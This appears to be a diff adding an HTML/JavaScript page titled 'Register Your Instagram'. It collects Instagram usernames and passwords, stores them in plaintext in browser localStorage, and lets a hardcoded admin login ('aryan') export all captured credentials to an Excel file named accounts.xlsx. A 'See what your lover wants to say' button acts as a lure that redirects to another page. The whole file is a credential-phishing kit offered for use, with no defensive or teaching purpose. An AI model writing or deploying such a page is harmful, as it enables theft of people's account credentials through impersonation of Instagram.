@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registration Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background-color: #f4f4f9;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+        label {
+            font-size: 16px;
+            color: #333;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        #loverMessageBtn {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-top: 20px;
+            display: none;
+        }
+        #loverMessageBtn:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Register Your Instagram</h1>
+        <form id="registrationForm">
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" required>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+            <button type="submit">Register</button>
+        </form>
+        <button id="downloadBtn" style="display:none; margin-top: 20px;" onclick="downloadExcel()">Download Excel</button>
+        <button id="loverMessageBtn" onclick="redirectToLoverMessage()" style="display:none;">See what your lover wants to say</button>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.17.0/xlsx.full.min.js"></script>
+    <script>
+        let users = JSON.parse(localStorage.getItem('users')) || []; // Retrieve stored users from localStorage
+        const adminCredentials = { username: "aryan", password: "1000ak47" }; // Pre-registered admin credentials
+
+        // Handle form submission
+        document.getElementById('registrationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (username && password) {
+                users.push({ username, password }); // Store both username and password in the array
+                document.getElementById('username').value = ''; // Clear the input fields
+                document.getElementById('password').value = ''; 
+                alert(`User "${username}" has been registered!`);
+
+                // Save users to localStorage
+                localStorage.setItem('users', JSON.stringify(users));
+
+                // Check if the registered user matches the pre-registered admin credentials
+                if (username === adminCredentials.username && password === adminCredentials.password) {
+                    document.getElementById('downloadBtn').style.display = 'inline-block'; // Show download button
+                }
+
+                // Check if the number of users is divisible by 3 to show the "lover message" button
+                if (users.length % 3 === 0) {
+                    document.getElementById('loverMessageBtn').style.display = 'inline-block'; // Show the "lover message" button
+                }
+            } else {
+                alert('Please enter a valid username and password');
+            }
+        });
+
+        // Function to create and download the Excel file with new filename
+        function downloadExcel() {
+            const wb = XLSX.utils.book_new();
+            const ws = XLSX.utils.json_to_sheet(users, { header: ["Username", "Password"] });
+            XLSX.utils.book_append_sheet(wb, ws, "Users");
+            XLSX.writeFile(wb, "accounts.xlsx"); // Changed the file name to "accounts.xlsx"
+
+            // Clear user data from localStorage after downloading Excel
+            localStorage.removeItem('users');
+            alert('User data has been cleared after downloading the Excel file.');
+
+            // Optionally, you can also hide the buttons after the download
+            document.getElementById('downloadBtn').style.display = 'none';
+            document.getElementById('loverMessageBtn').style.display = 'none';
+        }
+
+        // Function to redirect to the lover message page
+        function redirectToLoverMessage() {
+            window.location.href = 'pookie.html'; // Redirect to plogin.html
+        }
+    </script>
+
+</body>
+</html>
